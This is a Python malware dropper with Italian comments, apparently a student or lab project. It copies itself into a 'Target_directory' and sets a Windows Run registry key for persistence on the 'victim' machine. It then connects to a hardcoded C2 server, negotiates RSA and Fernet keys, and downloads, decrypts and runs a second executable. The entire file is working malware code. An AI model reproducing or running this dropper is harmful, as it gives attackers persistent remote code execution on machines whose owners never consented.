import os       # path
import shutil   # utilizzato per copiare il malware nel filesystem
import winreg   # utilizzato per accedere al Windows registry per ottenere persistenza
import socket   # connessione verso il server
import rsa      # generazione coppia di chiavi pubblica/privata
import pickle   # serializzazione
import sys
from cryptography.fernet import Fernet
BUFFER_SIZE = 512
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

def set_reg(name, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                                      winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError as we:
        winreg.CloseKey(registry_key)
        return False


def get_reg(name):
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                                       winreg.KEY_READ)
        value, regtype = winreg.QueryValueEx(registry_key, name)
        winreg.CloseKey(registry_key)
        return value
    except WindowsError as we:
        winreg.CloseKey(registry_key)
        return None

if __name__ == '__main__':
    # replica del malware nella cartella Target_directory

    if getattr(sys, 'frozen', False):
        # If the application is run as a bundle, the PyInstaller bootloader
        # extends the sys module by a flag frozen=True and sets the app
        # path into variable _MEIPASS. sys.executable for one-file executables
        path_file_corrente = sys.executable
        print("Path_file_corrente: {}".format(path_file_corrente))
        path_destinazione = os.path.dirname(sys.executable)
        print(path_destinazione)
    else:
        path_file_corrente = (os.path.abspath(__file__))
        path_destinazione = os.path.dirname(os.path.abspath(__file__))
        print("path_destinazione: {}".format(path_destinazione))

    if not os.path.exists(os.path.join(path_destinazione, "Target_directory") ):
        os.makedirs(os.path.join(path_destinazione, "Target_directory"))

    path_destinazione = os.path.join(path_destinazione, "Target_directory", "malware.exe")

    # replico il malware solamente quando ce n'è bisogno
    if not os.path.isfile(path_destinazione):
        shutil.copyfile(path_file_corrente, path_destinazione)

    # Garantisco la persistenza nella macchina della vittima
    # inserendo il percorso del malware nella chiave di registro
    # Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    # ho scelto la chiave HKEY_CURRENT_USER perché così non devo avere diritti di admin
    # https://sensei-infosec.netlify.app/forensics/registry/persistence/2020/04/15/malware-persistence-registry.html

    # Read value
    if get_reg('Test_privacy') is None:
        set_reg('Test_privacy', path_file_corrente)
    else:
        print("Chiave di registro già presente")

    # connessione al server C2
    ip_server = "192.168.10.10"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
    port_server = 65438
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Tentativo di connessione al server C2...")
    server.connect((ip_server, port_server))
    print("Connessione al server C2 avvenuta con successo!")
    # per Giordano: qui mettici pure il percorso in cui vuoi che venga scaricato il malware che ti invia il server
    path_real_malware_from_C2 = r'C:\\Users\\' + os.getlogin() + r'\\Desktop\\malwareC2.exe'

    # genero la coppia di chiavi pubblica-privata
    (publicKey, privateKey) = rsa.newkeys(1024)
    server.send(pickle.dumps(publicKey))
    server.recv(10)

    with open(path_real_malware_from_C2, "wb") as malware_from_C2:
        byte_key = server.recv(BUFFER_SIZE)
        key = rsa.decrypt(byte_key, privateKey)
        decyphered_key = pickle.loads(key)
        symmetric_key = Fernet(decyphered_key)
        print("Chiave simmetrica ricevuta: {}".format(str(decyphered_key)))
        bytes_read = b""
        server.send("Ok".encode("utf8"))
        # leggo la dimensione del file da ricevere
        file_length = server.recv(BUFFER_SIZE).decode('utf8')
        file_length = int(file_length)
        print("Dimensione file: {}".format(file_length))
        server.send("Ok".encode("utf8"))
        while True:
            bytes_read += server.recv(BUFFER_SIZE)
            if len(bytes_read) == file_length:
                break
        malware_from_C2.write(symmetric_key.decrypt(bytes_read))

    print("Terminato!")
    server.close()
    # eseguo il malware
    os.startfile(path_real_malware_from_C2)